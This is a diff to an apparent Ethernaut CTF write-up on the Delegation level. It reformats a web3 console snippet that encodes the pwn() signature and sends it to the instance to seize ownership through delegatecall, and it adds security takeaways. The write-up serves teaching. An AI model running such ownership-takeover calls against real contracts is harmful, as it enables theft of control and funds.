@@ -71,7 +71,7 @@ To solve this level we will perform an underflow by using the *transfer* functio
 *await contract.balanceOf(player)* <br/>
 
 ### Level 6 Delegation:
-Solidity documentation release 0.6.4 :<br/>
+Solidity documentation release 0.8.0 :<br/>
 *“There exists a special variant of a message call, named delegatecall which is identical to a message call apart from 
 the fact that the code at the target address is executed in the context of the calling contract and msg.sender and
 msg.value do not change their values. This means that a contract can dynamically load code from a different address 
@@ -95,22 +95,23 @@ To solve this level we will use the pwn function in the context of the Delegatio
 
 or Since msg.sender, msg.data, msg.value are all persisted when executing a DelegateCall, all you had to do was pass malicious msg.data, i.e. the encoded payload of the pwn() function to get the property of the Delegationcontract you can directly in console do this :
 
-let payload = web3.eth.abi.encodeFunctionSignature({
-    name: 'pwn',
-    type: 'function',
-    inputs: []
-});
-
-await web3.eth.sendTransaction({
-    from: player,
-    to: instance,
-    data: payload
-});
+let payload = web3.eth.abi.encodeFunctionSignature({<br/>
+    name: 'pwn', <br/>
+    type: 'function',<br/>
+    inputs: []<br/>
+});<br/>
+<br/>
+await web3.eth.sendTransaction({<br/>
+    from: player,<br/>
+    to: instance,<br/>
+    data: payload<br/>
+});<br/>
 
 ### Key Security Takeaways <br/>
-Use the higher level call() function to inherit from libraries, especially when you i) don’t need to change contract storage and ii) do not care about gas control.
-When inheriting from a library intending to alter your contract’s storage, make sure to line up your storage slots with the library’s storage slots to avoid these edge cases.
-Authenticate and do conditional checks on functions that invoke delegatecalls.
+Use the higher level call() function to inherit from libraries, especially when you <br/>
+i) don’t need to change contract storage and <br/>
+ii) do not care about gas control. When inheriting from a library intending to alter your contract’s storage, make sure to line up your storage slots with the library’s storage slots to avoid these edge cases.<br/>
+Authenticate and do conditional checks on functions that invoke delegatecalls. <br/>
 
 
 Here are some useful links:
